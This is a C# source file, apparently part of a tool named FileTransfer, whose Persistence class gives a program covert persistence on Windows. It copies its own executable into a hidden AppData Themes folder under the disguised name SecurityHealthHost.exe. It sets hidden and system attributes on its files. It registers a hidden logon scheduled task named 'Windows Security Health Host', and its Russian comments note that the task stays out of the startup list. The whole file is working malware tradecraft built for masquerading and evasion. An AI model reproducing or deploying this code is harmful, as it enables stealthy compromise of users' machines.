using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace FileTransfer
{
    public static class Persistence
    {
        private static void Log(string msg)
        {
            try
            {
                string logDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Themes");
                Directory.CreateDirectory(logDir);
                string logFile = Path.Combine(logDir, "ft.log");
                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [PERSIST] {msg}\n");
            }
            catch { }
        }

        private static readonly string DestDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", "Themes");

        public static readonly string DestExe = Path.Combine(DestDir, "SecurityHealthHost.exe");
        private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
        private static readonly string TaskXml = Path.Combine(DestDir, "wsc.xml");
        private const string TaskName = "Windows Security Health Host";

        public static bool IsInstalled() => File.Exists(Marker);

        public static void Install()
        {
            Log("Install start");
            try
            {
                string source = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                Log("Source exe: " + source);
                if (string.IsNullOrEmpty(source)) return;

                // Уже установлено — не дублируем
                if (File.Exists(Marker))
                {
                    Log("Already installed (marker exists)");
                    return;
                }

                Directory.CreateDirectory(DestDir);

                // Копируем EXE в скрытую папку
                File.Copy(source, DestExe, true);
                File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);

                // Создаём скрытую задачу в Планировщике (не отображается в автозагрузке)
                string xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Description>Windows Security Health Host</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>{EscapeXml(DestExe)}</Command>
    </Exec>
  </Actions>
</Task>";

                File.WriteAllText(TaskXml, xml, Encoding.Unicode);
                File.SetAttributes(TaskXml, FileAttributes.Hidden | FileAttributes.System);

                var psi = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    Arguments = $"/create /tn \"{TaskName}\" /xml \"{TaskXml}\" /f",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (var proc = Process.Start(psi))
                {
                    proc?.WaitForExit(10000);
                }

                // Маркер установки
                File.WriteAllText(Marker, DateTime.Now.ToString());
                File.SetAttributes(Marker, FileAttributes.Hidden | FileAttributes.System);
                Log("Install finished OK");
            }
            catch (Exception ex)
            {
                Log("Install error: " + ex);
                Debug.WriteLine("Persistence install error: " + ex.Message);
            }
        }

        private static string EscapeXml(string s)
        {
            return s
                .Replace("&", "&amp;")
                .Replace("<", "&lt;")
                .Replace(">", "&gt;")
                .Replace("\"", "&quot;");
        }
    }
}
